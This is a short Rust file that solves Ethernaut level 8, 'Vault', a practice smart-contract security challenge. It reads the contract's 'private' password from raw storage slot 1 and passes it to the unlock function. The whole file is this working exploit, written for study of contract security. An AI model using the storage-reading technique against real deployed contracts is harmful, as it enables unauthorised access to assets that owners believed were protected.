use async_trait::async_trait;
use ctf::ethernaut::lvl08_vault::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 8: Vault
     *
     * Unlock the vault to pass the level!
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Vault::new(target.address, offender.to_owned());
        let slot = offender
            .get_storage_at(contract.address(), H256::from_low_u64_be(1), None)
            .await?;
        contract.unlock(slot.0).send().await?.await?;
        Ok(())
    }
}
